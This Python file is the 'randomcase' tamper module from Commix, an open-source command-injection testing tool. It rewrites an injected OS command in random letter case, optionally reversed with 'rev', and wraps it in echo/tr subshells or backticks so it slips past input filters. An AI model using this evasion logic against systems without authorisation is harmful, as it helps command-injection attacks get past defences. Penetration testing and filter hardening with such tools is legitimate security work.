#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from random import choice
from src.utils import settings

"""
About: Replaces each character in a user-supplied OS command with a random case.
Notes: This tamper script works against Unix-like target(s).
"""

__tamper__ = "randomcase"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def tamper(payload):
  _ = (''.join(choice((str.upper, str.lower))(c) for c in settings.USER_APPLIED_CMD))
  if settings.EXPLOITATION_PHASE:
    if settings.TAMPER_SCRIPTS["rev"]:
      if settings.USE_BACKTICKS:
        _ = _[::-1] + "|rev"
      else:
        _ = "$(echo \"" + _[::-1]  + "\"|rev" + ")" 
    if settings.USER_APPLIED_CMD in settings.RAW_PAYLOAD:
      if settings.USE_BACKTICKS:
        random_case_cmd = "\\`echo " + _ + "|tr \"[A-Z]\" \"[a-z]\"\\`"
      else:
        random_case_cmd = "$(echo " + _ + "|tr \"[A-Z]\" \"[a-z]\")"
      payload = settings.RAW_PAYLOAD.replace(settings.USER_APPLIED_CMD, random_case_cmd)
      if len(settings.WHITESPACES) != 0:
        try:
          payload = payload.replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
        except:
          pass
  return payload

# eof